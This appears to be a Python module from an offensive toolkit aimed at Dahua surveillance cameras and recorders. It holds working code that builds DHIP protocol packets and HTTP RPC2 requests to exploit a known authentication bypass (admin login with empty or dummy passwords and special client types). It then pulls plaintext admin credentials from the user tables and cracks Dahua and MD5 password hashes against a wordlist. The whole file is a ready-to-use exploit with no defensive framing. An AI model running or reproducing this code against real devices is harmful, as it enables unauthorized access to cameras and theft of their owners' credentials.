"""Shared Dahua utilities: DHIP protocol, credential extraction, hash cracking."""
import hashlib
import json
import os
import socket
import struct

import requests

DHIP_MAGIC = b'\x20\x00\x00\x00DHIP'
DHIP_PORTS = [37777, 37778, 47777]

DEFAULT_PORTS = [80, 2051, 8080, 8181, 37777, 37778, 47777]

USER_AGENT = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'

_DATA_DIR = os.path.join(os.path.dirname(__file__), '..', 'data')


def _dahua_gen1_hash(password):
    m = hashlib.md5(password.encode('latin-1')).digest()
    crypt = list(m)
    out = []
    for i in range(0, len(crypt), 2):
        v = (crypt[i] + crypt[i + 1]) % 62
        if v < 10:
            v += 48
        elif v < 36:
            v += 55
        else:
            v += 61
        out.append(chr(v))
    return ''.join(out)


def _load_passwords():
    path = os.path.join(_DATA_DIR, 'passwords.txt')
    try:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return ['']


def _crack_dahua_hash(pw_hash, wordlist=None):
    if not pw_hash or not isinstance(pw_hash, str):
        return None
    if wordlist is None:
        wordlist = _load_passwords()
    is_md5 = len(pw_hash) == 32 and all(c in '0123456789abcdefABCDEF' for c in pw_hash)
    for candidate in wordlist:
        if is_md5:
            if hashlib.md5(candidate.encode('latin-1')).hexdigest().upper() == pw_hash.upper():
                return candidate
        else:
            if _dahua_gen1_hash(candidate) == pw_hash:
                return candidate
    return None


def _parse_passwd_ugm(content):
    users = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split(':')
        if len(parts) >= 3 and parts[1] and parts[2]:
            users.append((parts[1], parts[2]))
    return users


def _parse_account_config(text):
    users = []
    current_user = ''
    current_hash = ''
    for line in text.splitlines():
        line = line.strip()
        if '.Name=' in line:
            if current_user and current_hash:
                users.append((current_user, current_hash))
            current_user = line.split('=', 1)[1].strip()
            current_hash = ''
        elif '.Password=' in line or '.Pswd=' in line:
            current_hash = line.split('=', 1)[1].strip()
    if current_user and current_hash:
        users.append((current_user, current_hash))
    return users


def _build_dhip_packet(json_data, session_id=0, request_id=0):
    payload = json.dumps(json_data).encode('ascii')
    header = DHIP_MAGIC
    header += struct.pack('<I', session_id)
    header += struct.pack('<I', request_id)
    header += struct.pack('<I', len(payload))
    header += struct.pack('<I', 0)
    header += struct.pack('<I', len(payload))
    header += struct.pack('<I', 0)
    return header + payload


def _recv_dhip_response(sock, timeout=5):
    sock.settimeout(timeout)
    header = b''
    while len(header) < 32:
        chunk = sock.recv(32 - len(header))
        if not chunk:
            return None
        header += chunk
    if header[4:8] != b'DHIP':
        return None
    json_len = struct.unpack('<I', header[16:20])[0]
    if json_len == 0 or json_len > 1048576:
        return None
    data = b''
    while len(data) < json_len:
        chunk = sock.recv(min(4096, json_len - len(data)))
        if not chunk:
            break
        data += chunk
    try:
        return json.loads(data.decode('ascii', errors='ignore').rstrip('\x00'))
    except Exception:
        return None


def _dhip_call(sock, method, params, session_id, request_id, timeout=5):
    query = {"method": method, "params": params, "id": request_id, "session": session_id}
    sock.sendall(_build_dhip_packet(query, session_id=session_id, request_id=request_id))
    return _recv_dhip_response(sock, timeout)


def dhip_extract_credentials(ip, timeout=5):
    """Connect via DHIP binary, bypass auth, extract plaintext credentials."""
    for dhip_port in DHIP_PORTS:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((ip, dhip_port))
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            continue
        try:
            login_data = {
                "method": "global.login",
                "params": {
                    "userName": "admin", "password": "",
                    "clientType": "NetKeyboard", "loginType": "Direct",
                    "authorityType": "Default", "passwordType": "Default",
                },
                "id": 1, "session": 0,
            }
            s.sendall(_build_dhip_packet(login_data, session_id=0, request_id=1))
            resp = _recv_dhip_response(s, timeout)
            if not resp or resp.get('result') is not True:
                s.close()
                continue
            session_id = resp.get('session', 0)

            req_id = 2
            for method, params in [
                ('userManager.getUserInfoAll', None),
                ('configManager.getConfig', {"name": "OnvifUser"}),
                ('configManager.getConfig', {"name": "UserInfoDetail"}),
            ]:
                r = _dhip_call(s, method, params, session_id, req_id, timeout)
                req_id += 1
                if r and r.get('result') is True:
                    table = r.get('params', {})
                    users = table.get('users', table.get('table', []))
                    if isinstance(users, list):
                        for u in users:
                            if isinstance(u, dict):
                                name = u.get('Name', u.get('UserName', ''))
                                pw = u.get('Password', '')
                                if name == 'admin' and pw and pw != '******':
                                    s.close()
                                    return 'admin', pw
            s.close()
            return 'admin', ''
        except Exception:
            try:
                s.close()
            except Exception:
                pass
    return None, None


def http_extract_credentials(ip, port, timeout=5):
    """Extract credentials via HTTP RPC2 with session_id from bypass."""
    headers = {
        'User-Agent': USER_AGENT,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close',
    }
    for bypass_json in [
        {"method": "global.login", "params": {
            "userName": "admin", "password": "Not Used",
            "clientType": "NetKeyboard", "loginType": "Direct",
            "authorityType": "Default", "passwordType": "Default"},
         "id": 1, "session": 0},
        {"method": "global.login", "params": {
            "userName": "admin", "password": "",
            "clientType": "Dahua3.0-Web3.0-NOTUSED", "loginType": "Loopback",
            "authorityType": "Default", "passwordType": "Default"},
         "id": 1, "session": 0},
    ]:
        try:
            r = requests.post(f'http://{ip}:{port}/RPC2_Login', headers=headers,
                              json=bypass_json, verify=False, timeout=timeout)
            if r.status_code != 200:
                continue
            data = r.json()
            if data.get('result') is not True:
                continue
            session_id = data.get('session', '')
            cookies = {'DhWebClientSessionID': str(session_id)}
            for call in [
                {"method": "userManager.getUserInfoAll", "params": {}, "id": 99, "session": session_id},
                {"method": "configManager.getConfig", "params": {"name": "OnvifUser"}, "id": 100, "session": session_id},
                {"method": "configManager.getConfig", "params": {"name": "UserInfoDetail"}, "id": 101, "session": session_id},
            ]:
                try:
                    r2 = requests.post(f'http://{ip}:{port}/RPC2', headers=headers,
                                       json=call, cookies=cookies, verify=False, timeout=timeout)
                    d2 = r2.json()
                    if d2.get('result') is True:
                        table = d2.get('params', {})
                        users = table.get('users', table.get('table', []))
                        if isinstance(users, list):
                            for u in users:
                                if isinstance(u, dict):
                                    name = u.get('Name', u.get('UserName', ''))
                                    pw = u.get('Password', '')
                                    if name == 'admin' and pw and pw != '******':
                                        return 'admin', pw
                except Exception:
                    pass
        except Exception:
            pass
    return None, None
